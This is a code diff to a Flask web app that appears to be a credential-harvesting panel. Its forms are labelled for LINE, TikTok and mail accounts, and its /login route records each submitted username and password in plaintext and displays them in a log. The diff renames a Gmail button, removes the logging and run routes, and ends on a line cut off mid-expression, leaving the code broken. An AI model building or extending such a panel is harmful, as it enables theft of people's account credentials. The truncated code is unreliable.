@@ -1,5 +1,4 @@
 from flask import Flask, request, jsonify
-import sys, io, traceback
 from datetime import datetime
 
 app = Flask(__name__)
@@ -36,7 +35,7 @@ input{width:100%;padding:12px;margin:6px 0;background:#010409;border:1px solid #
 <button onclick="openForm('2 - REGISTRO COBRA')">2=REGISTRO</button>
 <button onclick="openForm('3 - LINE COBRA')">3=LINE COBRA</button>
 <button onclick="openForm('4 - TIKTOK COBRA')">4=TIKTOK COBRA</button>
-<button onclick="openForm('5 - GMAIL COBRA')">5=MAIL COBRA</button>
+<button onclick="openForm('5 - MAIL COBRA')">5=MAIL COBRA</button>
 <button onclick="salir()">6=SALIR</button>
 </div>
 <div class="box" id="formArea">
@@ -51,7 +50,6 @@ input{width:100%;padding:12px;margin:6px 0;background:#010409;border:1px solid #
 <div id="logs"></div>
 </div>
 </div>
-
 <script>
 let moduloActual = "";
 function openForm(mod){
@@ -98,22 +96,4 @@ def login():
     entry = f"[{hora}] {data['modulo']} -> Usuario: {data['user']} | Contraseña: {data['pass']}"
     logs.append(entry)
     if len(logs) > 50: logs.pop(0)
-    html = "".join([f"<div class='log-entry'><b>{l}</b></div>" for l in reversed(logs)])
-    return jsonify({"html": html})
-
-@app.route('/log', methods=['POST'])
-def log():
-    txt = request.json.get('txt','')
-    hora = datetime.now().strftime("%H:%M:%S")
-    logs.append(f"[{hora}] {txt}")
-    return jsonify({"ok":True})
-
-@app.route('/getlogs')
-def getlogs():
-    html = "".join([f"<div class='log-entry'><b>{l}</b></div>" for l in reversed(logs)])
-    if not html:
-        html = "<div class='log-entry'>Esperando interacciones...</div>"
-    return jsonify({"html": html})
-
-if __name__ == '__main__':
-    app.run()
+    html = "".join([f"<div class='log-entry'><b>{
